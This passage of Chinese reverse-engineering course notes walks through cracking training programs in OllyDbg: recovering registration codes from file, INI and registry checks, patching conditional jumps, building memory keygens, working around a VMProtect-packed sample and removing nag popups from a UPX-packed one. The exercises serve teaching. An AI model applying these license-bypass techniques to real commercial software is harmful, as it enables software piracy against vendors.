创建或打开文件，这里是打开文件\n```\n\nReadFile函数，当程序运行到`00402046`时，Buffer指针指向文件内容首地址`0012F348`。\n\n```asm\n00402039  |.  56            push esi                                 ; /pOverlapped = NULL\n0040203A  |.  50            push eax                                 ; |pBytesRead = 0012F348\n0040203B  |.  68 04010000   push 0x104                               ; |BytesToRead = 104 (260.)\n00402040  |.  8D85 F4FEFFFF lea eax,[local.67]                       ; |\n00402046  |.  50            push eax                                 ; |Buffer = 0012F348\n00402047  |.  57            push edi                                 ; |hFile = 000000AC (window)\n00402048  |.  FF15 28345400 call dword ptr ds:[<&KERNEL32.ReadFile>] ; \\ReadFile 读文件内容\n```\n\n在信息窗口选中右键->数据窗口跟随，发现全是空数据，执行完这个函数时，`0012F348`出现我们输入的字符串。\n\n```asm\n00402048  |.  FF15 28345400 call dword ptr ds:[<&KERNEL32.ReadFile>] ; \\ReadFile\n0040204E  |.  85C0          test eax,eax;返回值为1，表明文件不为空\n00402050  |.  74 3D         je short 52PoJie?0040208F\n00402052  |.  B9 24465400   mov ecx,52PoJie?00544624                 ;  JXU2MjExJXU2\n00402057  |.  8D85 F4FEFFFF lea eax,[local.67]\n0040205D  |.  8D49 00       lea ecx,dword ptr ds:[ecx]\n00402060  |>  8A10          /mov dl,byte ptr ds:[eax];这个循环执行的是strcmp函数，比较eax和ecx是否相等。执行到这一句时，eax是我们输入的字符串，ecx是上面的注释JXU2MjExJXU2\n00402062  |.  3A11          |cmp dl,byte ptr ds:[ecx]\n00402064  |.  75 1A         |jnz short 52PoJie?00402080\n00402066  |.  84D2          |test dl,dl\n00402068  |.  74 12         |je short 52PoJie?0040207C\n0040206A  |.  8A50 01       |mov dl,byte ptr ds:[eax+0x1]\n0040206D  |.  3A51 01       |cmp dl,byte ptr ds:[ecx+0x1]\n00402070  |.  75 0E         |jnz short 52PoJie?00402080\n00402072  |.  83C0 02       |add eax,0x2\n00402075  |.  83C1 02       |add ecx,0x2\n00402078  |.  84D2          |test dl,dl\n0040207A  |.^ 75 E4         \\jnz short 52PoJie?00402060\n0040207C  |>  33C0          xor eax,eax\n```\n\n所以很容易就知道重启验证1的注册码是`JXU2MjExJXU2`。将生成的.txt文件内容改为这个，再打开原程序发现验证通过。\n\n验证2、3一样操作，但需要注意，一定要先生成一个配置文件或写入注册表再进行重启验证调试。验证1生成的.txt文件不影响验证2和验证3的调试，可以不删除。\n\n验证2：\n\n```asm\n00402C34  |.  E8 77F4FFFF   call 52PoJie?004020B0\n00402C39  |.  85C0          test eax,eax\n00402C3B  |.  74 11         je short 52PoJie?00402C4E\n00402C3D  |.  68 18465400   push 52PoJie?00544618                    ;  验证通过\n```\n\n```asm\n0040210C  |.  B9 40465400   mov ecx,52PoJie?00544640                 ;  NjJGJXU3NTI\n```\n\n验证3：\n\n```asm\n00402CB2  |.  E8 B9F4FFFF   call 52PoJie?00402170\n00402CB7  |.  85C0          test eax,eax\n00402CB9  |.  74 37         je short 52PoJie?00402CF2\n00402CBB  |.  68 18465400   push 52PoJie?00544618                    ;  验证通过\n```\n\n```asm\n004021FE  |.  B9 54465400   mov ecx,52PoJie?00544654                 ;  4JXU2MjM3\n```\n\n细心一点就会在字符串列表发现这三个注册码\n\n{% asset_img 注册码.png 注册码 %}\n\n最后，重启验证的普通思路\n\n1. 如果是写进.txt文件，一般都是这个步骤：\n\n   CreateFileA->WriteFile->ReadFile->比较算法\n\n2. 如果是写进.ini文件，一般都是这个步骤：\n\n   WritePrivateProfileStringA(写入配置信息)->GetPrivateProfileStringA(读取配置信息)\n\n3. 如果是写进注册表，一般都是这个步骤：\n\n   创建注册表Key:RegCreateKey->打开注册表Key:RegOpenKey->写入注册表键值:RegSetValueEx->查询注册表键值:RegQueryValue(Ex)\n\n三个都通过后，会出现一个彩蛋，输入字符串后，弹出消息框。\n\n{% asset_img 彩蛋.png 彩蛋 %}\n\n输入不同字符串弹窗显示不同的内容。彩蛋很简单，其实就是把三个验证码拼接，Base64解码，UTF-8转换，得到“我是用户”。\n\n```asm\nJXU2MjExJXU2NjJGJXU3NTI4JXU2MjM3\n\nBase64解码：\n%u6211%u662F%u7528%u6237\n\nUnicode转换：\n我是用户\n```\n\n{% asset_img 编码转换.png 编码转换 %}\n\n把三个验证码拼接，弹窗。\n\n{% asset_img 彩蛋3.png 彩蛋 %}\n\n# 4. 重启验证作业\n\n输入假码没什么反应。\n\n{% asset_img 课后作业.png 课后作业 %}\n\n拉去OD看看，搜索字符串，发现只有一个验证码`ITN3UXJGJ`显示。\n\n{% asset_img 搜索字符串2.png 搜索字符串 %}\n\n双击进去发现有`CreateFile`和`ReadFile`，所以判定这个是写入`.txt`文件的注册码。\n\n{% asset_img txt文件.png txt文件 %}\n\n用`GetPrivateProfileStringA`函数找到`.ini`文件的比较注册码算法。Ctrl+N，搜索`GetPrivateProfileStringA`右键->在每个参考上设置断点。或者在反汇编窗口右键->查找->所有模块间的调用，搜索函数，右键->在每个调用到`GetPrivateProfileStringA`上设置断点。一个一个断点点进去看，找到一个最像比较算法的(有循环、比较、跳转指令)。\n\n```asm\n0040218F  |.  66:C785 F0FEF>mov word ptr ss:[ebp-0x110],0x1A28       ; |\n00402198  |.  FF15 1C345400 call dword ptr ds:[<&KERNEL32.GetPrivate>; \\GetPrivateProfileStringA\n0040219E  |.  5E            pop esi                                  ;  kernel32.7C817077\n0040219F  |.  85C0          test eax,eax\n004021A1  |.  74 4D         je short 吾爱破解.004021F0\n004021A3  |.  8D8D F4FEFFFF lea ecx,[local.67]\n004021A9  |.  8D51 01       lea edx,dword ptr ds:[ecx+0x1]\n004021AC  |.  8D6424 00     lea esp,dword ptr ss:[esp]\n004021B0  |>  8A01          /mov al,byte ptr ds:[ecx]    \n004021B2  |.  41            |inc ecx                       \n004021B3  |.  84C0          |test al,al\n004021B5  |.^ 75 F9         \\jnz short 吾爱破解.004021B0\n004021B7  |.  2BCA          sub ecx,edx                              ;  ntdll.KiFastSystemCallRet\n004021B9  |.  83F9 0E       cmp ecx,0xE                   \n004021BC  |.  75 32         jnz short 吾爱破解.004021F0\n004021BE  |.  33C0          xor eax,eax                   \n004021C0  |>  0FB69405 E4FE>/movzx edx,byte ptr ss:[ebp+eax-0x11C]\n004021C8  |.  0FBE8C05 F4FE>|movsx ecx,byte ptr ss:[ebp+eax-0x10C]\n004021D0  |.  83C2 30       |add edx,0x30                 \n004021D3  |.  3BD1          |cmp edx,ecx                   \n004021D5  |.  75 19         |jnz short 吾爱破解.004021F0\n004021D7  |.  40            |inc eax\n004021D8  |.  83F8 0E       |cmp eax,0xE\n004021DB  |.^ 72 E3         \\jb short 吾爱破解.004021C0\n```\n\n由于这个断点程序没有被经过，很难分析它的算法(我目前能力有限)。要想经过这段算法，就要看一下我们输入字符串后，程序怎么运行的。反汇编窗口右键->查找->所有模块间的调用，搜索`GetWindowTextA`，在每个调用到`GetWindowTextA`上设置断点。输入字符串后运行，程序停在某断点处。养成好习惯，把其它的`GetWindowTextA`断点取消。\n\n```asm\n0041837E  |.  FF15 2C365400 call dword ptr ds:[<&USER32.GetWindowTex>; \\GetWindowTextA\n00418384  |.  8B4D 08       mov ecx,[arg.1]\n00418387  |.  6A FF         push -0x1\n00418389  |.  E8 AEFEFEFF   call 吾爱破解.0040823C\n0041838E  |.  5E            pop esi                                  ;  00940796\n0041838F  |.  5D            pop ebp                                  ;  00940796\n00418390  |.  C2 0400       retn 0x4\n```\n\n返回上一级函数\n\n```asm\n004029D3  |.  E8 7F590100   call 吾爱破解.00418357                       ;  GetWindowTextA函数所在\n004029D8  |.  8B4D EC       mov ecx,[local.5]                        ;  字符串存进ecx\n004029DB  |.  8B79 F4       mov edi,dword ptr ds:[ecx-0xC]           ;  字符串长度存进edi\n004029DE  |.  85FF          test edi,edi\n004029E0  |.  74 1A         je short 吾爱破解.004029FC                   ;  字符串长度为0跳转\n004029E2  |.  33D2          xor edx,edx                              ;  edx清零\n004029E4  |.  85FF          test edi,edi\n004029E6  |.  7E 14         jle short 吾爱破解.004029FC                  ;  字符串长度小于等于0跳转\n004029E8  |>  85D2          /test edx,edx\n004029EA  |.  78 36         |js short 吾爱破解.00402A22                  ;  结果为负跳转\n004029EC  |.  3BD7          |cmp edx,edi\n004029EE  |.  7F 32         |jg short 吾爱破解.00402A22                  ;  大于跳转\n004029F0  |.  803C0A 2D     |cmp byte ptr ds:[edx+ecx],0x2D          ;  判断字符是否是“-”\n004029F4  |.  75 01         |jnz short 吾爱破解.004029F7                 ;  不是指向下一个字符\n004029F6  |.  46            |inc esi                                 ;  是就+1\n004029F7  |>  42            |inc edx\n004029F8  |.  3BD7          |cmp edx,edi\n004029FA  |.^ 7C EC         \\jl short 吾爱破解.004029E8                  ;  遍历完字符串退出循环\n004029FC  |>  C1E6 04       shl esi,0x4\n004029FF  |.  83EE 02       sub esi,0x2\n00402A02  |.  B8 CDCCCCCC   mov eax,0xCCCCCCCD\n00402A07  |.  F7E6          mul esi\n\t\t\t;\t执行完这条指令后edx的值被覆盖，所以下面的0x18不能看作是字符串长度，字符串长度存储在edi里\n00402A09  |.  C1EA 03       shr edx,0x3                              ;  根据edx右移3位后要等于3，所以3左移3位等于0x18\n00402A0C  |.  BE FFFFFFFF   mov esi,-0x1                  \n00402A11  |.  83EA 03       sub edx,0x3                              ;  根据下面跳转判断edx=3\n00402A14  |.  0F85 C8020000 jnz 吾爱破解.00402CE2                        ;  不为0跳转，这里跳转绕过注册成功\n00402A1A  |.  85FF          test edi,edi\n00402A1C  |.  7F 0E         jg short 吾爱破解.00402A2C\n00402A1E  |.  0BF6          or esi,esi\n00402A20  |.  EB 23         jmp short 吾爱破解.00402A45\n00402A22  |>  68 57000780   push 0x80070057\n00402A27  |.  E8 C4E9FFFF   call 吾爱破解.004013F0\n00402A2C  |>  6A 2D         push 0x2D\n00402A2E  |.  51            push ecx\n00402A2F  |.  E8 D4921100   call 吾爱破解.0051BD08\n```\n\n进一步分析这几条指令：\n\n```asm\n004029FC  |> \\C1E6 04       shl esi,0x4                              ;  从下面逆推0x20右移4位为2，所以“-”的个数为2\n004029FF  |.  83EE 02       sub esi,0x2                              ;  要使下面的edx=0x18,这里esi=0x1E+2=0x20才对\n\t\t ;  esi=18 66666666除以CCCCCCCD=0X1E\n00402A02  |.  B8 CDCCCCCC   mov eax,0xCCCCCCCD                       ;  eax=CCCCCCCD\n00402A07  |.  F7E6          mul esi                                  ;  edx拼接eax=esi*eax要等于00000018 66666666\n00402A09  |.  C1EA 03       shr edx,0x3                              ;  根据edx右移3位后要等于3，所以3左移3位等于0x18\n```\n\n懂了，所以字符串中需要两个“-”号。输入`1234567-89012345-6789012`试试(“-”号位置任意)。\n\n{% asset_img -.png 输入字符串 %}\n\n发现注册成功。注册成功后会在目录下生成.txt，.ini文件，写入注册表。\n\n```\n52pojie.txt\n1234567\n\n52pojie.ini\n[验证]\nKey=89012345\n\n注册表\n6789012\n```\n\n从上面的分析中已经知道.txt文件的注册码是`ITN3UXJGJ`，改了再说，这里是9个字符。这时再下断`GetPrivateProfileStringA`函数，程序就会经过这个算法。此时就可以分析算法了。\n\n```asm\n00402198  |.  FF15 1C345400 call dword ptr ds:[<&KERNEL32.GetPrivate>; \\GetPrivateProfileStringA\n0040219E  |.  5E            pop esi\n0040219F  |.  85C0          test eax,eax                             ;  ini文件的字符串长度\n004021A1  |.  74 4D         je short 吾爱破解.004021F0                   ;  字符串长度为0跳转\n004021A3  |.  8D8D F4FEFFFF lea ecx,[local.67]                       ;  ecx等于字符串\n004021A9  |.  8D51 01       lea edx,dword ptr ds:[ecx+0x1]\n004021AC  |.  8D6424 00     lea esp,dword ptr ss:[esp]\n004021B0  |>  8A01          /mov al,byte ptr ds:[ecx]\n004021B2  |.  41            |inc ecx                                 ;  指针+1指向下个字符\n004021B3  |.  84C0          |test al,al\n004021B5  |.^ 75 F9         \\jnz short 吾爱破解.004021B0                 ;  遍历字符串\n004021B7  |.  2BCA          sub ecx,edx                              ;  ecx存进字符串长度\n004021B9  |.  83F9 0E       cmp ecx,0xE                              ;  ini文件中字符串长度为14\n004021BC  |.  75 32         jnz short 吾爱破解.004021F0\n004021BE  |.  33C0          xor eax,eax                              ;  eax清零\n004021C0  |>  0FB69405 E4FE>/movzx edx,byte ptr ss:[ebp+eax-0x11C]   ;  将真正的注册码存入edx\n004021C8  |.  0FBE8C05 F4FE>|movsx ecx,byte ptr ss:[ebp+eax-0x10C]   ;  将输入的字符串存入ecx\n004021D0  |.  83C2 30       |add edx,0x30                            ;  将真正的注册码+0x30\n004021D3  |.  3BD1          |cmp edx,ecx                             ;  与输入的字符串对比\n004021D5  |.  75 19         |jnz short 吾爱破解.004021F0\n004021D7  |.  40            |inc eax\n004021D8  |.  83F8 0E       |cmp eax,0xE\n004021DB  |.^ 72 E3         \\jb short 吾爱破解.004021C0\n```\n\n在数据窗口Ctrl+G输入`ebp+eax-0x11c`，第1行就是真正的注册码，第2行是输入的字符串。\n\n```asm\n0012F33C  3A 1E 02 25 28 1A 48 15 3A 1D 02 25 28 1A 00 00  :\u001e\u0002%(\u001aH\u0015:\u001d\u0002%(\u001a..\n0012F34C  38 39 30 31 34 35 36 37 38 39 30 31 32 31 00 00  89014567890121..\n```\n\n将真正的注册码+0x30就是我们要输入的字符串`jN2UXJxEjM2UXJ`。\n\n```asm\n6A 4E 32 55 58 4A 78 45 6A 4D 32 55 58 4A\n```\n\n将目录下的.ini文件信息修改为以上字符串。\n\n注册表部分。在反汇编窗口右键->查找->所有模块间的调用，搜索`RegQueryValueExA`函数，右键->在每个调用到`RegQueryValueExA`上设置断点。找到有比较算法那个，分析。\n\n```asm\n00402285  |.  FF15 24305400 call dword ptr ds:[<&ADVAPI32.RegQueryVa>; \\RegQueryValueExA\n0040228B  |.  85C0          test eax,eax\n0040228D  |.  0F85 E1000000 jnz 吾爱破解.00402374\n00402293  |.  8D8D F4FEFFFF lea ecx,[local.67]                       ;  输入的字符串\n00402299  |.  8D51 01       lea edx,dword ptr ds:[ecx+0x1]\n0040229C  |.  8D6424 00     lea esp,dword ptr ss:[esp]\n004022A0  |>  8A01          /mov al,byte ptr ds:[ecx]\n004022A2  |.  41            |inc ecx\n004022A3  |.  84C0          |test al,al\n004022A5  |.^ 75 F9         \\jnz short 吾爱破解.004022A0                 ;  遍历字符串\n004022A7  |.  2BCA          sub ecx,edx                              ;  ecx=字符串长度=9\n004022A9  |.  83C1 06       add ecx,0x6                              ;  所以ecx=字符串长度+6=0xF\n004022AC  |.  B8 CDCCCCCC   mov eax,0xCCCCCCCD                       ;  eax=CCCCCCCD\n004022B1  |.  F7E1          mul ecx                                  ;  要使得edx拼接eax=ecx*eax=C 33333336\n004022B3  |.  C1EA 02       shr edx,0x2                              ;  edx=0x0C\n004022B6  |.  83EA 03       sub edx,0x3                              ;  edx=0x3\n004022B9  |.  0F85 B5000000 jnz 吾爱破解.00402374                        ;  退出函数，不能跳\n004022BF  |.  E8 D82D0000       call 吾爱破解.0040509C\n```\n\n所以注册表的注册码是9个字符，修改修改再继续。\n\n```asm\n004022BF  |.  E8 D82D0000       call 吾爱破解.0040509C                       ;  mov eax=lJT\n004022C4  |.  8BC8              mov ecx,eax\n004022C6  |.  85C9              test ecx,ecx\n004022C8  |.  0F84 C3000000     je 吾爱破解.00402391\n004022CE  |.  8B01              mov eax,dword ptr ds:[ecx]               ;  eax=lJT.\n004022D0  |.  FF50 0C           call dword ptr ds:[eax+0xC]              ;  eax指向地址58E5E0,也就是lJT.的下一地址\n004022D3  |.  8A95 F8FEFFFF     mov dl,byte ptr ss:[ebp-0x108]           ;  dl指向输入的字符第五个字符的地址\n004022D9  |.  8D70 10           lea esi,dword ptr ds:[eax+0x10]          ;  esi=58e5f0\n004022DC  |.  0FBE85 F4FEFFFF   movsx eax,byte ptr ss:[ebp-0x10C]        ;  eax=字符串的第1个字符\n004022E3  |.  0FBECA            movsx ecx,dl                             ;  ecx=字符串的第5个字符\n004022E6  |.  48                dec eax                                  ;  eax=eax-1\n004022E7  |.  89B5 E4FEFFFF     mov [local.71],esi                       ;  吾爱破解.0058E5F0\n004022ED  |.  3BC1              cmp eax,ecx                              ;  str[0]-1==str[4]\n004022EF  |.  75 69             jnz short 吾爱破解.0040235A                  ;  不能跳\n```\n\n字符串中第1个字符要比第5个字符大1，修改修改继续。\n\n```asm\n004022F1  |.  0FBE85 FCFEFFFF   movsx eax,byte ptr ss:[ebp-0x104]        ;  eax=输入的第9个字符\n004022F8  |.  83C1 02           add ecx,0x2\n004022FB  |.  3BC8              cmp ecx,eax                              ;  str[8]==str[4]+2\n004022FD  |.  75 5B             jnz short 吾爱破解.0040235A\n```\n\n字符串中第9个字符要比第5个字符大2，修改修改继续。\n\n```asm\n004022FF  |.  80F2 54           xor dl,0x54                              ;  dl是第5个字符\n00402302  |.  80FA 66           cmp dl,0x66                              ;  第5个字符与0x54异或要等于0x66\n00402305  |.  75 53             jnz short 吾爱破解.0040235A\n```\n\n所以第5个字符是0x32('2')，也可以推算出，第1个字符是'3'，第9个字符是'4'。修改修改再继续。push了3个参数，第一个参数是长度，第二个参数是\"MjM\"，第三个参数是字符串的第2个字符的地址。猜测这个函数是比较2-4位是否为\"MjM\"。\n\n```asm\n00402307  |.  6A 03             push 0x3\n00402309  |.  8D85 F5FEFFFF     lea eax,dword ptr ss:[ebp-0x10B]         ;  eax=字符串的第2个字符地址\n0040230F  |.  68 3C465400       push 吾爱破解.0054463C                       ;  MjM\n00402314  |.  50                push eax\n00402315  |.  E8 76991100       call 吾爱破解.0051BC90\n0040231A  |.  83C4 0C           add esp,0xC\n0040231D  |.  85C0              test eax,eax\n0040231F  |.  75 39             jnz short 吾爱破解.0040235A\n```\n\n修改一下试试。跳转没有实现，猜测正确。下面是一样的步骤。\n\n```asm\n00402321  |.  6A 03             push 0x3\n00402323  |.  8D85 F9FEFFFF     lea eax,dword ptr ss:[ebp-0x107]         ;  eax=第6个字符地址\n00402329  |.  68 40465400       push 吾爱破解.00544640                       ;  UXJ\n0040232E  |.  50                push eax\n0040232F  |.  E8 5C991100       call 吾爱破解.0051BC90\n00402334  |.  83C4 0C           add esp,0xC\n00402337  |.  85C0              test eax,eax\n00402339  |.  75 1F             jnz short 吾爱破解.0040235A\n```\n\n综上，注册表的注册码为`3MjM2UXJ4`。\n\n完整注册码为`ITN3UXJGJ-jN2UXJxEjM2UXJ-3MjM2UXJ4`，得到彩蛋。\n\n{% asset_img 彩蛋2.png 彩蛋2 %}\n\n{% asset_img 我是彩蛋.png 彩蛋2 %}\n\n点击“我是彩蛋”有一连串的弹窗提示。这些弹窗语句早在我们搜索字符串的时候就已经看到了。\n\n{% asset_img 搜索字符串2.png 搜索字符串 %}\n\nKey1=ITN3UXJGJ-jN2UXJxEjM2UXJ-3MjM2UXJ4\n\nKey2_1=4JXU2MjM3-JXU2MjExJXU2Nj-JGJXU3NTl\n\nKey2_2=3MjM2UXJ4-jN2UXJxEjM2UXJ-ITN3UXJGJ\n\nKey2_3=JGJXU3NTl-JXU2MjExJXU2Nj-4JXU2MjM3\n\nKey2的所有数字之和长度之间的差为4，且比长度大。所以彩蛋Key长度为12。\n\nKey的倒数第二位为2，最后一位为=。Key=00000000002=\n\nKey的第一位是什么呢？B，我们经常说的，NB！Key=N0000000002=\n\nKey的倒数第三位是Key2的第三位？J、j、X？\n\nKey的第二位为管理员名字的首字母，管理员是Hmily，所以是H，Key=NH000000002=\n\nKey的第三位和第九位一样，都是第五位的小写字母。\n\n好难猜啊...我看到答案是NHlkLXpdIU2=，但完全不知道怎么得来的。\n\n# 5. 给程序打补丁\n\n吾爱破解内存补丁生成器V1.00：做程序补丁\n\nKeyMake V2.0 修改版：做内存注册机\n\n{% asset_img 注册失败.png 注册失败 %}\n\n拉进OD，查找敏感字符串。\n\n```asm\n0040342B  |. /75 07         jnz short 第六课例.00403434\n0040342D  |. |68 78E15700   push 第六课例.0057E178                       ;  注册成功\n00403432  |. |EB 10         jmp short 第六课例.00403444\n00403434  |> \\68 84E15700   push 第六课例.0057E184                       ;  注册失败\n00403439  |.  EB 09         jmp short 第六课例.00403444\n0040343B  |>  6A 00         push 0x0\n0040343D  |.  6A 00         push 0x0\n0040343F  |.  68 6CE15700   push 第六课例.0057E16C                       ;  输入为空\n00403444  |>  E8 67080100   call 第六课例.00413CB0\n```\n\n爆破补丁版：将地址为`40342B`的`jnz`直接修改为`jz`或`nop`即可。\n\n那如果使用吾爱破解内存补丁生成器V1.00爆破要怎么操作呢？找到需要修改的地址后，打开补丁生成器，将程序拖入补丁生成器中，输入内存地址和需要修改成什么指令，添加指令，导出补丁。\n\n{% asset_img 补丁.png 打补丁 %}\n\n关闭OD后打开补丁程序，点击“开始补丁”就会自动运行补丁程序，此时输入什么都可以注册成功了。\n\n{% asset_img 补丁成功.png 打补丁 %}\n\n注册机版：向上划到段首下断运行，F8单步到此处。寄存器窗口和堆栈窗口都可看到真正的注册码。\n\n```asm\n00403400  |> /8A10          /mov dl,byte ptr ds:[eax]                ;  eax指向真正的注册码\n00403402  |. |3A11          |cmp dl,byte ptr ds:[ecx]                ;  ecx指向输入的注册码\n00403404  |. |75 1A         |jnz short 第六课例.00403420\n00403406  |. |84D2          |test dl,dl\n00403408  |. |74 12         |je short 第六课例.0040341C\n0040340A  |. |8A50 01       |mov dl,byte ptr ds:[eax+0x1]\n0040340D  |. |3A51 01       |cmp dl,byte ptr ds:[ecx+0x1]\n00403410  |. |75 0E         |jnz short 第六课例.00403420\n00403412  |. |83C0 02       |add eax,0x2\n00403415  |. |83C1 02       |add ecx,0x2\n00403418  |. |84D2          |test dl,dl\n0040341A  |.^\\75 E4         \\jnz short 第六课例.00403400\n```\n\n```asm\n0012F6EC   186B4420\n0012F6F0   00000111\n0012F6F4   00000000\n0012F6F8   00194078  ASCII \"202CB962AC59075B964B07152D234B70\"\n0012F6FC   00194078  ASCII \"202CB962AC59075B964B07152D234B70\"\n0012F700   00192828  ASCII \"852\"\n0012F704   001927B8  ASCII \"123\"\n```\n\n记下运行到`403400`，真正的注册码存在了寄存器窗口的eax的值(注册码字符串的首地址)里。\n\n打开Keymake，其它->内存注册机，将需要制作注册机的程序加载进来，添加。编辑信息->添加->生成。\n\n{% asset_img 注册机.png 注册机 %}\n\n运行注册机，发现需要两个框都填了才能给注册码，否则提示“输入为空”。为了美观，也可将`004033A7`的跳转指令nop掉。\n\n```asm\n00403384  |.  50            push eax                                 ;  将用户名入栈\n00403385  |.  8D8F 30010000 lea ecx,dword ptr ds:[edi+0x130]\n0040338B  |.  E8 12630100   call 第六课例.004196A2\n00403390  |.  8B45 EC       mov eax,[local.5]                        ;  eax=用户名\n00403393  |.  83CF FF       or edi,-0x1\n00403396  |.  8378 F4 00    cmp dword ptr ds:[eax-0xC],0x0\n0040339A  |.  0F84 9B000000 je 第六课例.0040343B                         ;  用户名为空跳转\n004033A0  |.  8B45 E8       mov eax,[local.6]\n004033A3  |.  8378 F4 00    cmp dword ptr ds:[eax-0xC],0x0\n004033A7  |.  0F84 8E000000 je 第六课例.0040343B                         ;  注册码为空跳转\n```\n\nnop掉后再生成注册机。虽然不会提示“输入为空”，但也会提示“注册失败”字样，暂时没有什么好的办法，就这样吧。(提示“输入为空”比“注册失败”要好，还是别改了吧)\n\n{% asset_img 注册码2.png 注册码 %}\n\n也可以用Keymake制作内存补丁，[Shark恒 制作内存补丁](https://www.bilibili.com/video/BV1cw411Z7Ab?p=22) 。\n\n# 6. 打补丁作业\n\n程序加了VMProtect壳。VMProtect 是软件保护系统，将保护后的代码放到虚拟机中运行，这将使分析反编译后的代码和破解变得极为困难。这个我目前还不会手脱，那就在有壳的基础上修改吧。\n\nF9运行程序跑起来，进入OD的`E`模块，双击进入程序代码块(.exe)。取消分析，智能搜索发现字符串都能看到了。搜索敏感字符串进入反汇编代码，还是熟悉的位置。\n\n```asm\n0040346B   /75 07           jnz short 吾爱破解.00403474\n0040346D   |68 80E15700     push 吾爱破解.0057E180                       ; 注册成功\n00403472   |EB 10           jmp short 吾爱破解.00403484\n00403474   \\68 8CE15700     push 吾爱破解.0057E18C                       ; 注册失败\n00403479    EB 09           jmp short 吾爱破解.00403484\n0040347B    6A 00           push 0x0\n0040347D    6A 00           push 0x0\n0040347F    68 6CE15700     push 吾爱破解.0057E16C                       ; 输入为空\n00403484    E8 78080100     call 吾爱破解.00413D01\n```\n\n爆破补丁版：\n\n但发现这样nop后保存文件会提示“无法定位数据”。\n\n{% asset_img 无法定位数据.png 无法定位数据 %}\n\n这时就需要吾爱破解内存补丁生成器V1.00了。`jnz`的机器码为0x75，`je`指令为0x74，`nop`的机器码为0x90。关闭OD再运行补丁。\n\n注册机版：\n\n由于程序有壳，无法重新载入，但还是可以在这个函数中一步步运行程序到算法处，按照5的方法生成注册机即可。\n\n```asm\n00403440  |>  8A10          /mov dl,byte ptr ds:[eax];真正注册码\n00403442  |. |3A11          |cmp dl,byte ptr ds:[ecx];输入的字符串\n00403444  |. |75 1A         |jnz short 吾爱破解.00403460\n00403446  |. |84D2          |test dl,dl\n00403448  |. |74 12         |je short 吾爱破解.0040345C\n0040344A  |. |8A50 01       |mov dl,byte ptr ds:[eax+0x1]\n0040344D  |. |3A51 01       |cmp dl,byte ptr ds:[ecx+0x1]\n00403450  |. |75 0E         |jnz short 吾爱破解.00403460\n00403452  |. |83C0 02       |add eax,0x2\n00403455  |. |83C1 02       |add ecx,0x2\n00403458  |. |84D2          |test dl,dl\n0040345A  |.^\\75 E4         \\jnz short 吾爱破解.00403440\n```\n\n分析算法：\n\n在段首下断，输入用户名和注册码后运行，程序停在断点处。F8一步步跟，分析每一步程序做了什么。执行完`4033BF`地址的指令后，可以看到堆栈窗口中用户名和“123456”拼接在一起。\n\n{% asset_img 连接字符串.png 连接字符串 %}\n\n执行完`4033FE`地址的指令后，堆栈窗口出现真正的注册码。\n\n{% asset_img 生成注册码.png 真正的注册码 %}\n\n那我们进去看看它是怎么生成的。看到这一大段就应该意识到这是MD5的初始化处理。\n\n```asm\n00401B55    C745 D8 0000000>mov dword ptr ss:[ebp-0x28],0x0\n00401B5C    C745 D4 0000000>mov dword ptr ss:[ebp-0x2C],0x0\n00401B63    C745 DC 0123456>mov dword ptr ss:[ebp-0x24],0x67452301\n00401B6A    C745 E0 89ABCDE>mov dword ptr ss:[ebp-0x20],0xEFCDAB89\n00401B71    C745 E4 FEDCBA9>mov dword ptr ss:[ebp-0x1C],0x98BADCFE\n00401B78    C745 E8 7654321>mov dword ptr ss:[ebp-0x18],0x10325476\n00401B7F    C645 FC 02      mov byte ptr ss:[ebp-0x4],0x2\n00401B83    8B45 08         mov eax,dword ptr ss:[ebp+0x8]\n00401B86    8B70 F4         mov esi,dword ptr ds:[eax-0xC]\n```\n\n传入的参数是用户名和“123456”拼接，所以密码是MD5(用户名+\"123456\")。","categories":["Windows逆向"],"tags":["OllyDbg","吾爱破解培训"]},{"title":"第二三课——去弹窗、主页锁定及DIY","url":"/posts/7cd35487.html","content":"\n# 1. 了解Windows API\n\n消息框：MessageBoxA/W（Ansi[ASCII]/WideChar[Unicode]）\n\n弹页面：\n\nShellExecuteA/W：open url——控制台执行\n\n<!--more-->\n\nWinExec：explorer.exe url——Windows执行\n\nCreateProcessA/W：PATH url——创建进程\n\n注册表相关：RegCreateKeyExA/W、RegOpenKeyExA/W、RegDeleteKeyExA/W\n\n创建线程：CreateThread\n\n# 2. 实例一\n\n简单的UPX壳，先脱壳才能查找字符串、去除弹窗。\n\n脱壳后程序运行，出现一个弹窗，再出现弹页面。弹窗点确定后，出现主程序，不一会儿又弹出一个页面，再一会儿后又弹出一个页面。\n\n目标：去除NAG，只剩一个主程序(课程介绍的链接不用去除)。\n\n首先去除弹窗。弹窗关键字符串“来试试我的程序啊”。脱壳后的程序载入OD，右键->中文搜索引擎->智能搜索。双击关键字符串去到反汇编窗口。\n\n```asm\n004014BA    C3              retn;上个函数结束\n004014BB    56              push esi;关键字符串函数开始\n004014BC    57              push edi\n004014BD    6A 67           push 0x67\n004014BF    6A 00           push 0x0\n004014C1    FF15 3C204000   call dword ptr ds:[<&kernel32.#GetNamedPipeHa>; kernel32.GetModuleHandleW\n004014C7    50              push eax\n004014C8    FF15 E8204000   call dword ptr ds:[<&user32.#445>]            ; user32.LoadIconW\n004014CE    8B75 08         mov esi,dword ptr ss:[ebp+0x8]                ; dumped_.<ModuleEntryPoint>\n004014D1    50              push eax\n004014D2    6A 00           push 0x0\n004014D4    68 80000000     push 0x80\n004014D9    56              push esi\n004014DA    FF15 F4204000   call dword ptr ds:[<&user32.#577>]            ; user32.SendMessageW\n004014E0    6A 00           push 0x0\n004014E2    68 70214000     push dumped_.00402170                         ; 52PoJie\n004014E7    68 80214000     push dumped_.00402180                         ; 来试试我的程序啊\n004014EC    56              push esi\n004014ED    FF15 EC204000   call dword ptr ds:[<&user32.#484>]            ; user32.MessageBoxW\n004014F3    8B3D 18204000   mov edi,dword ptr ds:[<&kernel32.#CreateThrea>; kernel32.CreateThread\n004014F9    6A 00           push 0x0\n004014FB    6A 00           push 0x0\n004014FD    6A 00           push 0x0\n004014FF    68 A0104000     push dumped_.004010A0\n00401504    6A 00           push 0x0\n00401506    6A 00           push 0x0\n00401508    FFD7            call edi\n0040150A    6A 00           push 0x0\n0040150C    6A 00           push 0x0\n0040150E    6A 00           push 0x0\n00401510    68 90124000     push dumped_.00401290\n00401515    6A 00           push 0x0\n00401517    6A 00           push 0x0\n00401519    FFD7            call edi\n0040151B    68 98214000     push dumped_.00402198                         ; 吾爱破解培训第二课实例一\\r\\n本程序会有一个弹窗和三次弹网页操作\\r\\n请把广告去除，加油！\n00401520    68 E9030000     push 0x3E9\n00401525    56              push esi\n00401526    FF15 F0204000   